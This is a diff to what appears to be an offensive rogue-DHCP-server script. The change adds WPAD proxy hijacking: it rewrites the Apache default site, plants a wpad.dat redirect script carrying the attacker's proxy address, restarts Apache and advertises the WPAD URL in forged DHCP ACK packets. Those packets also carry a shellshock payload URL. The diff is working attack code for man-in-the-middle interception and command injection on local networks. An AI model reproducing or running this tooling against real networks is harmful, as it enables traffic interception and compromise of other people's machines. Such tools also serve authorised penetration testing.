@@ -9,17 +9,20 @@ path.append(utils_path)
 
 from base import Base
 from network import Ethernet_raw, ARP_raw, IP_raw, UDP_raw, DHCP_raw
+from tm import ThreadManager
 from scanner import Scanner
 
 from sys import exit
 from argparse import ArgumentParser
 from ipaddress import IPv4Address
 from socket import socket, AF_PACKET, SOCK_RAW, htons
+from os import errno, makedirs
+from shutil import copyfile
 from base64 import b64encode
 from netaddr import IPAddress
-from tm import ThreadManager
 from time import sleep
 from random import randint
+import subprocess as sub
 # endregion
 
 # region Check user, platform and create threads
@@ -48,7 +51,7 @@ parser.add_argument('--router', type=str, help='Set router IP address, if not se
 parser.add_argument('--dns', type=str, help='Set DNS server IP address, if not set use your ip address', default=None)
 parser.add_argument('--tftp', type=str, help='Set TFTP server IP address', default=None)
 parser.add_argument('--wins', type=str, help='Set WINS server IP address', default=None)
-parser.add_argument('--proxy', type=str, help='Set Proxy URL', default=None)
+parser.add_argument('--proxy', type=str, help='Set Proxy URL, example: 192.168.0.1:8080', default=None)
 parser.add_argument('--domain', type=str, help='Set domain name for search, default=local', default="local")
 parser.add_argument('--lease_time', type=int, help='Set lease time, default=172800', default=172800)
 
@@ -110,7 +113,7 @@ router_ip_address = None
 dns_server_ip_address = None
 tftp_server_ip_address = None
 wins_server_ip_address = None
-proxy_url = None
+wpad_url = None
 
 dhcp_discover_packets_source_mac = None
 
@@ -230,7 +233,7 @@ else:
         dhcp_server_ip_address = args.dhcp_ip
 # endregion
 
-# region Set router, dns, tftp, wins IP address and proxy url
+# region Set router, dns, tftp, wins IP address
 
 # Set router IP address
 if args.router is None:
@@ -275,11 +278,79 @@ else:
     else:
         wins_server_ip_address = args.wins
 
-# Set proxy url
-if args.proxy is None:
-    proxy_url = "http://" + your_ip_address + "/wpad.dat"
-else:
-    proxy_url = args.proxy
+# endregion
+
+# region Set proxy
+
+if args.proxy is not None:
+
+    # Set variables
+    wpad_url = "http://" + your_ip_address + "/wpad.dat"
+    apache2_sites_available_dir = "/etc/apache2/sites-available/"
+    apache2_sites_path = "/var/www/html/"
+    wpad_path = apache2_sites_path + "wpad/"
+
+    # Apache2 sites settings
+    default_site_file_name = "000-default.conf"
+    default_site_file = open(apache2_sites_available_dir + default_site_file_name, 'w')
+    default_site_file.write("<VirtualHost *:80>\n" +
+                            "\tServerAdmin admin@wpad.com\n" +
+                            "\tDocumentRoot " + wpad_path + "\n" +
+                            "\t<Directory " + wpad_path + ">\n" +
+                            "\t\tOptions FollowSymLinks\n" +
+                            "\t\tAllowOverride None\n" +
+                            "\t\tOrder allow,deny\n" +
+                            "\t\tAllow from all\n" +
+                            "\t</Directory>\n" +
+                            "</VirtualHost>\n")
+    default_site_file.close()
+
+    # Create dir with wpad.dat script
+    try:
+        makedirs(wpad_path)
+    except OSError:
+        Base.print_info("Path: ", wpad_path, " already exist")
+    except:
+        Base.print_error("Something else went wrong while trying to create path: ", wpad_path)
+        exit(1)
+
+    # Copy wpad.dat script
+    wpad_script_name = "wpad.dat"
+    wpad_script_src = utils_path + wpad_script_name
+    wpad_script_dst = wpad_path + wpad_script_name
+    copyfile(src=wpad_script_src, dst=wpad_script_dst)
+
+    # Read redirect script
+    with open(wpad_script_dst, 'r') as redirect_script:
+        content = redirect_script.read()
+
+    # Replace the Proxy URL
+    content = content.replace('proxy_url', args.proxy)
+
+    # Write redirect script
+    with open(wpad_script_dst, 'w') as redirect_script:
+        redirect_script.write(content)
+
+    # Restart Apache2 server
+    try:
+        Base.print_info("Restarting apache2 server ...")
+        sub.Popen(['service apache2 restart  >/dev/null 2>&1'], shell=True)
+    except OSError as e:
+        if e.errno == errno.ENOENT:
+            Base.print_error("Program: ", "service", " is not installed!")
+            exit(1)
+        else:
+            Base.print_error("Something went wrong while trying to run ", "`service apache2 restart`")
+            exit(2)
+
+    # Check apache2 is running
+    sleep(2)
+    apache2_pid = Base.get_process_pid("apache2")
+    if apache2_pid == -1:
+        Base.print_error("Apache2 server is not running!")
+        exit(1)
+    else:
+        Base.print_info("Apache2 server is running, PID: ", str(apache2_pid))
 
 # endregion
 
@@ -315,7 +386,7 @@ if not args.quiet:
     Base.print_info("Router IP address: ", router_ip_address)
     Base.print_info("DNS server IP address: ", dns_server_ip_address)
     Base.print_info("TFTP server IP address: ", tftp_server_ip_address)
-    Base.print_info("Proxy url: ", proxy_url)
+    Base.print_info("Proxy url: ", args.proxy)
 # endregion
 
 
@@ -392,7 +463,7 @@ def make_dhcp_ack_packet(transaction_id, target_mac, target_ip, destination_mac=
                                      dns=dns_server_ip_address,
                                      dhcp_operation=5,
                                      payload=shellshock_url,
-                                     proxy=bytes(proxy_url),
+                                     proxy=bytes(wpad_url),
                                      domain=domain,
                                      tftp=tftp_server_ip_address,
                                      wins=wins_server_ip_address,
